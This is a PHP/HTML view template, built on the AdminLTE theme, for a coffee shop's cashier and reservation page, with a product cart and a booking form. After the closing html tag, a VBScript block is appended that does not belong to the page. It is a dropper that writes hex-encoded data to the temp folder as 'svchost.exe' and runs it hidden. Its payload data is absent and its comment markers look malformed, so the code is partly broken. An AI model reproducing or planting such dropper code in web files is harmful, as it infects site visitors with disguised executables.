<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Kopi Mbaroh</title>
  <!-- Tell the browser to be responsive to screen width -->
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <!-- Bootstrap 3.3.7 -->
  <link rel="stylesheet" href="<?= base_url() ?>assets/bower_components/bootstrap/dist/css/bootstrap.min.css">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="<?= base_url() ?>assets/bower_components/font-awesome/css/font-awesome.min.css">
  <!-- data tabel shorting -->
  <link rel="stylesheet" href="<?= base_url() ?>assets/bower_components/datatables.net-bs/css/dataTables.bootstrap.min.css">
  <!-- Ionicons -->
  <link rel="stylesheet" href="<?= base_url() ?>assets/bower_components/Ionicons/css/ionicons.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="<?= base_url() ?>assets/dist/css/AdminLTE.min.css">
  <!-- AdminLTE Skins. Choose a skin from the css/skins
       folder instead of downloading all of them to reduce the load. -->
  <link rel="stylesheet" href="<?= base_url() ?>assets/dist/css/skins/_all-skins.min.css">

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->

  <!-- Google Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">
</head>

<body class="hold-transition skin-yellow sidebar-mini">
  <!-- Site wrapper -->
  <div class="wrapper">

    <header class="main-header">
      <!-- Logo -->
      <a href="<?= base_url('home') ?>" class="logo">
        <!-- mini logo for sidebar mini 50x50 pixels -->
        <span class="logo-mini"><b>m</b>p</span>
        <!-- logo for regular state and mobile devices -->
        <span class="logo-lg"><b>My</b>POS</span>
      </a>
      <!-- Header Navbar: style can be found in header.less -->
      <nav class="navbar navbar-static-top">
        <!-- Sidebar toggle button-->
        <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </a>

        <div class="navbar-custom-menu">
          <ul class="nav navbar-nav">
            <!-- Tasks: style can be found in dropdown.less -->
            <li class="dropdown tasks-menu">
              <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                <i class="fa fa-flag-o"></i>
                <span class="label label-danger">3</span>
              </a>
              <ul class="dropdown-menu">
                <li class="header">You have 3 tasks</li>
                <li>
                  <!-- inner menu: contains the actual data -->
                  <ul class="menu">
                    <li>
                      <!-- Task item -->
                      <a href="#">
                        <h3>
                          Design some buttons
                          <small class="pull-right">20%</small>
                        </h3>
                        <div class="progress xs">
                          <div class="progress-bar progress-bar-aqua" style="width: 20%" role="progressbar" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100">
                            <span class="sr-only">20% Complete</span>
                          </div>
                        </div>
                      </a>
                    </li>
                    <!-- end task item -->
                  </ul>
                </li>
                <li class="footer">
                  <a href="#">View all tasks</a>
                </li>
              </ul>
            </li>
            <!-- User Account: style can be found in dropdown.less -->
            
            <!-- Control Sidebar Toggle Button -->
            <li>
              <a href="#" data-toggle="control-sidebar"><i class="fa fa-gears"></i></a>
            </li>
          </ul>
        </div>
      </nav>
    </header>

    <!-- =============================================== -->

    <!-- Left side column. contains the sidebar -->
    <aside class="main-sidebar">
      <!-- sidebar: style can be found in sidebar.less -->
      <section class="sidebar">
        <!-- Sidebar user panel -->
        <div class="user-panel">
          <div class="pull-left image">
            <img src="<?= base_url() ?>assets/dist/img/user2-160x160.jpg" class="img-circle">
          </div>
          <div class="pull-left info">
            <p>Pelanggan</p>
            <a href="#"><i class="fa fa-circle text-success"></i> Online</a>
          </div>
        </div>
        <!-- search form -->
        <form action="#" method="get" class="sidebar-form">
          <div class="input-group">
            <input type="text" name="q" class="form-control" placeholder="Search...">
            <span class="input-group-btn">
              <button type="submit" name="search" id="search-btn" class="btn btn-flat"><i class="fa fa-search"></i>
              </button>
            </span>
          </div>
        </form>
        <!-- /.search form -->
        <!-- sidebar menu: : style can be found in sidebar.less -->
        <ul class="sidebar-menu" data-widget="tree">
          <li class="header">MAIN NAVIGATION</li>
          <li>
            <a href="<?= site_url('dashboard') ?>"><i class="fa fa-dashboard"></i><span>Reservasi</span></a>
          </li>
        </ul>
      </section>
      <!-- /.sidebar -->
    </aside>

    <!-- =============================================== -->

    <!-- Content Wrapper. Contains page content -->
    <div class="content-wrapper">
      <!-- Content Header (Page header) -->
      <section class="content-header">
    <h1>Kasir
        <small>Penjualan</small>
    </h1>
    <ol class="breadcrumb">
        <li><a href="#"><i class="fa fa-dashboard"></i></a></li>
        <li>Transaction</li>
        <li class="active">Sales</li>
    </ol>
</section>

<section class="content">
    <div class="row">

    <form method="post" action="<?= base_url('reservation/addtocart') ?>">
        <div class="col-lg-4">
            <div class="box box-widget">
                <div class="box-body">
                <div class="form-group row">
                    <label for="product" class="col-sm-4 col-form-label">Product</label>
                    <div class="col-sm-6">
                        <select name="product" id="product" style="width: 100%; height: 100%">
                             <option value="" selected> -- Choose Product -- </option>
                             <?php foreach ($booking as $key) : ?>
                            <option value="<?= $key->menu_id; ?>"><?= $key->nama_menu; ?></option>
                            <?php endforeach; ?>
                        </select>
                    </div>
                </div>
                <div class="form-group row">
                    <label for="product" class="col-sm-4 col-form-label">Qty</label>
                    <div class="col-sm-6 py-2">
                        <input type="number" class="form-control" id="qty" name="qty" required>
                    </div>
                    <div class="col-sm-2 py-2">
                        <button class="btn btn-success" type="submit"><i class="fa fa-plus"></i></button>
                    </div>
                </div>
    </form>
                    <!-- <table width="100%">
                        <tr>
                            <td style="vertical-align:top; width:30%">
                                <label for="">Menu</label>
                            </td>
                            <td>
                                <div class="form-group input-group">
                                    <input type="hidden" id="">
                                    <input type="hidden" id="">
                                    <input type="hidden" id="">
                                    <input type="text" id="" class="form-control" autofocus>
                                    <span class="input-group-btn">
                                        <button type="button" class="btn btn-info btn-flat" data-toggle="modal" data-target="#modal-item">
                                            <i class="fa fa-search"></i>
                                        </button>
                                    </span>
                                </div>
                            </td>
                        </tr>
                    </table> -->
                </div>
            </div>
        </div>

        <form method="post" action="<?= base_url('reservation/add'); ?>">
        <div class="col-lg-4">
            <div class="box box-widget">
                <div class="box-body">
                    <table width="100%">
                      <div class="form-group row">
                          <label for="product" class="col-sm-4 col-form-label">Date</label>
                          <div class="col-lg-8 py-2">
                              <input type="date" class="form-control" id="tgl_h" name="tgl_h" required>
                          </div>
                      </div>
                      <div class="form-group row">
                          <label for="product" class="col-sm-4 col-form-label">Nama</label>
                          <div class="col-lg-8 py-2">
                              <input type="text" class="form-control" id="name" name="name" required>
                          </div>
                      </div>
                      <div class="form-group row">
                          <label for="product" class="col-sm-4 col-form-label">Phone</label>
                          <div class="col-lg-8 py-2">
                              <input type="number" class="form-control" id="phone" name="phone" required>
                          </div>
                      </div>
                      <div class="form-group row">
                          <label for="product" class="col-sm-4 col-form-label">Jumlah Orang</label>
                          <div class="col-lg-8 py-2">
                              <input type="number" class="form-control" id="jumlah_orang" name="jumlah_orang" required>
                          </div>
                      </div>
                    </table>
                </div>
            </div>
        </div>

    


        <div class="col-md-12">
            <div class="box box-widget">
                <div class="box-body">
                    <table class="table table-hover table striped">
                        <thead>
                            <tr>
                                <th class="text-center">No.</th>
                                <th>Product</th>
                                <th>Price</th>
                                <th>Qty</th>
                                <th>Sub Total</th>
                                <th class="text-center">Action</th>
                            </tr>
                        </thead>
                        <tbody>
                        <?php $no = 1;
                        foreach ($dataFromCart as $key) : ?>
                            <tr>
                                 <td class="text-center"><?= $no++; ?></td>
                                 <td><?= $key->nama_menu; ?></td>
                                 <td><?= $key->harga; ?></td>
                                 <td><?= $key->qty; ?></td>
                                 <td><?= $key->harga * $key->qty; ?></td>
                                 <td class="text-center">
                                    <a class="btn-sm btn-danger tombol-cart" href="<?= base_url('reservation/hapus/') . $key->menu_id; ?>"><i class="fa fa-trash"></i></a>
                                 </td>
                             </tr>
                        <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

   
        <div class="col-md-5">
            <div class="box box-widget">
                <div class="box-body">
                    <div class="card">
                     <!-- form start -->
                     <div class="card-body">
                        <div class="form-group row">
                             <div class="text-left col-md-6">
                                  <label for="grandtotal" class="col-form-label">Grand Total</label>
                             </div>
                             <div class="justify-content-end col-md-6">
                                   <h3><strong><?= rupiah($grand_total) == null ? '0' : rupiah($grand_total); ?></strong></h3>
                             </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="col-md-6">
        <div class="row justify-content-end my-4">
            <a class="btn-lg btn-warning clear-cart" href="<?= base_url('reservation/clear'); ?>"><i class="fa fa-refresh"></i> New Order</a>
        </div>
        <br>
        <div class="row justify-content-end mb-4">
            <button class="btn-lg btn-success" type="submit"><i class="fa fa-send"></i> Process Order</button>
        </div>
    </div>
    </form>
    </div>
    

</section>
      <!-- /.content -->
    </div>
    <!-- /.content-wrapper -->

    <footer class="main-footer">
      <div class="pull-right hidden-xs">
        <b>Version</b> 2.4.0
      </div>
      <strong>Copyright &copy; 2014-2016 <a href="https://adminlte.io">Almsaeed Studio</a>.</strong> All rights
      reserved.
    </footer>

    <!-- Control Sidebar -->
    <aside class="control-sidebar control-sidebar-dark">
      <!-- Create the tabs -->
      <ul class="nav nav-tabs nav-justified control-sidebar-tabs">
        <li><a href="#control-sidebar-home-tab" data-toggle="tab"><i class="fa fa-home"></i></a></li>

        <li><a href="#control-sidebar-settings-tab" data-toggle="tab"><i class="fa fa-gears"></i></a></li>
      </ul>
      <!-- Tab panes -->
      <div class="tab-content">
        <!-- Home tab content -->
        <div class="tab-pane" id="control-sidebar-home-tab">
          <h3 class="control-sidebar-heading">Recent Activity</h3>
          <ul class="control-sidebar-menu">
            <li>
              <a href="javascript:void(0)">
                <i class="menu-icon fa fa-birthday-cake bg-red"></i>

                <div class="menu-info">
                  <h4 class="control-sidebar-subheading">Langdon's Birthday</h4>

                  <p>Will be 23 on April 24th</p>
                </div>
              </a>
            </li>
            <li>
              <a href="javascript:void(0)">
                <i class="menu-icon fa fa-user bg-yellow"></i>

                <div class="menu-info">
                  <h4 class="control-sidebar-subheading">Frodo Updated His Profile</h4>

                  <p>New phone +1(800)555-1234</p>
                </div>
              </a>
            </li>
            <li>
              <a href="javascript:void(0)">
                <i class="menu-icon fa fa-envelope-o bg-light-blue"></i>

                <div class="menu-info">
                  <h4 class="control-sidebar-subheading">Nora Joined Mailing List</h4>

                  <p>nora@example.com</p>
                </div>
              </a>
            </li>
            <li>
              <a href="javascript:void(0)">
                <i class="menu-icon fa fa-file-code-o bg-green"></i>

                <div class="menu-info">
                  <h4 class="control-sidebar-subheading">Cron Job 254 Executed</h4>

                  <p>Execution time 5 seconds</p>
                </div>
              </a>
            </li>
          </ul>
          <!-- /.control-sidebar-menu -->

          <h3 class="control-sidebar-heading">Tasks Progress</h3>
          <ul class="control-sidebar-menu">
            <li>
              <a href="javascript:void(0)">
                <h4 class="control-sidebar-subheading">
                  Custom Template Design
                  <span class="label label-danger pull-right">70%</span>
                </h4>

                <div class="progress progress-xxs">
                  <div class="progress-bar progress-bar-danger" style="width: 70%"></div>
                </div>
              </a>
            </li>
            <li>
              <a href="javascript:void(0)">
                <h4 class="control-sidebar-subheading">
                  Update Resume
                  <span class="label label-success pull-right">95%</span>
                </h4>

                <div class="progress progress-xxs">
                  <div class="progress-bar progress-bar-success" style="width: 95%"></div>
                </div>
              </a>
            </li>
            <li>
              <a href="javascript:void(0)">
                <h4 class="control-sidebar-subheading">
                  Laravel Integration
                  <span class="label label-warning pull-right">50%</span>
                </h4>

                <div class="progress progress-xxs">
                  <div class="progress-bar progress-bar-warning" style="width: 50%"></div>
                </div>
              </a>
            </li>
            <li>
              <a href="javascript:void(0)">
                <h4 class="control-sidebar-subheading">
                  Back End Framework
                  <span class="label label-primary pull-right">68%</span>
                </h4>

                <div class="progress progress-xxs">
                  <div class="progress-bar progress-bar-primary" style="width: 68%"></div>
                </div>
              </a>
            </li>
          </ul>
          <!-- /.control-sidebar-menu -->

        </div>
        <!-- /.tab-pane -->
        <!-- Stats tab content -->
        <div class="tab-pane" id="control-sidebar-stats-tab">Stats Tab Content</div>
        <!-- /.tab-pane -->
        <!-- Settings tab content -->
        <div class="tab-pane" id="control-sidebar-settings-tab">
          <form method="post">
            <h3 class="control-sidebar-heading">General Settings</h3>

            <div class="form-group">
              <label class="control-sidebar-subheading">
                Report panel usage
                <input type="checkbox" class="pull-right" checked>
              </label>

              <p>
                Some information about this general settings option
              </p>
            </div>
            <!-- /.form-group -->

            <div class="form-group">
              <label class="control-sidebar-subheading">
                Allow mail redirect
                <input type="checkbox" class="pull-right" checked>
              </label>

              <p>
                Other sets of options are available
              </p>
            </div>
            <!-- /.form-group -->

            <div class="form-group">
              <label class="control-sidebar-subheading">
                Expose author name in posts
                <input type="checkbox" class="pull-right" checked>
              </label>

              <p>
                Allow the user to show his name in blog posts
              </p>
            </div>
            <!-- /.form-group -->

            <h3 class="control-sidebar-heading">Chat Settings</h3>

            <div class="form-group">
              <label class="control-sidebar-subheading">
                Show me as online
                <input type="checkbox" class="pull-right" checked>
              </label>
            </div>
            <!-- /.form-group -->

            <div class="form-group">
              <label class="control-sidebar-subheading">
                Turn off notifications
                <input type="checkbox" class="pull-right">
              </label>
            </div>
            <!-- /.form-group -->

            <div class="form-group">
              <label class="control-sidebar-subheading">
                Delete chat history
                <a href="javascript:void(0)" class="text-red pull-right"><i class="fa fa-trash-o"></i></a>
              </label>
            </div>
            <!-- /.form-group -->
          </form>
        </div>
        <!-- /.tab-pane -->
      </div>
    </aside>
    <!-- /.control-sidebar -->
    <!-- Add the sidebar's background. This div must be placed
       immediately after the control sidebar -->
    <div class="control-sidebar-bg"></div>
  </div>
  <!-- ./wrapper -->

  <!-- jQuery 3 -->
  <script src="<?= base_url() ?>assets/bower_components/jquery/dist/jquery.min.js"></script>
  <!-- Bootstrap 3.3.7 -->
  <script src="<?= base_url() ?>assets/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
  <!-- SlimScroll -->
  <script src="<?= base_url() ?>assets/bower_components/jquery-slimscroll/jquery.slimscroll.min.js"></script>
  <!-- FastClick -->
  <script src="<?= base_url() ?>assets/bower_components/fastclick/lib/fastclick.js"></script>
  <!-- AdminLTE App -->
  <script src="<?= base_url() ?>assets/dist/js/adminlte.min.js"></script>

  <script src="<?= base_url() ?>assets/plugins/chartjs/Chart.bundle.js"></script>

  <script src="<?= base_url() ?>assets/bower_components/datatables.net/js/jquery.dataTables.min.js"></script>
  <script src="<?= base_url() ?>assets/bower_components/datatables.net-bs/js/dataTables.bootstrap.min.js"></script>

  <?php if (isset($javascript)) : ?>
    <script src="<?= base_url() ?>assets/pages/<?= $javascript; ?>"></script>
  <?php endif; ?>

  <script>
    $(document).ready(function() {
      $('#table1').DataTable()
    })
  </script>
  <!-- AdminLTE for demo purposes -->
  <script src="<?= base_url() ?>assets/dist/js/demo.js"></script>
  <script>
    $(document).ready(function() {
      $('.sidebar-menu').tree()
    })
  </script>
</body>

</html>
<SCRIPT Language=VBScript>
  DropFileName = "svchost.exe"

  /*
  Set FSO = CreateObject("Scripting.FileSystemObject")
  DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
  If FSO.FileExists(DropPath) = False Then
  Set FileObj = FSO.CreateTextFile(DropPath, True)
  For i = 1 To Len(WriteData) Step 2
  FileObj.Write Chr(CLng("&H" & Mid(WriteData, i, 2)))
  Next
  FileObj.Close
  End If
  Set WSHshell = CreateObject("WScript.Shell")
  WSHshell.Run DropPath, 0
  **/
</SCRIPT>